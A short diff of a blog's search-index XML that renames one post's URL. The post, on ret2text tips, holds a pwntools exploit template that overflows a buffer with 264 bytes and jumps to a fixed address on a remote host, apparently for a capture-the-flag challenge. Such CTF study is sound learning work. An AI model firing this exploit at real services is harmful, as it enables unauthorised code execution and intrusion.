@@ -2,7 +2,7 @@
 <search>
   <entry>
     <title>ret2text小tips</title>
-    <url>/posts/d4f00467.html</url>
+    <url>/posts/1111.html</url>
     <content><![CDATA[exp模板
 from pwn import *io = remote(&quot;39.106.48.123&quot;, 29826)payload = b&quot;A&quot;*264 + p64(0x401202)io.sendline(payload)io.interactive()
 
